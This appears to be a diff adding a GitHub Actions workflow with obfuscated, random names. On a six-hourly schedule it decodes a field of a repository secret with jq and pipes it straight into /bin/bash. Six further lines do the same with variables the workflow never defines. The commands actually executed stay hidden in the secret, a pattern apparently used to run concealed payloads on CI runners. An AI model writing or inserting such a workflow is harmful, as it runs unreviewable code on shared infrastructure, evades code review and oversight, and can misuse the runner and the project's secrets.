@@ -1,0 +1,23 @@
+name: zhuyhdaohy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuyhdaohy
+        env:
+          gqb5835: ${{ secrets.gqb5835 }}
+        run: |
+          echo $gqb5835 | jq -r .bcob3847 | /bin/bash
+          echo $z338 | jq -r .iqgx0294 | /bin/bash
+          echo $dr68 | jq -r .vpz653 | /bin/bash
+          echo $doncf06623 | jq -r .p95 | /bin/bash
+          echo $io04299 | jq -r .l7 | /bin/bash
+          echo $tyxj97 | jq -r .qh935 | /bin/bash
+          echo $groeb134 | jq -r .q126 | /bin/bash
+
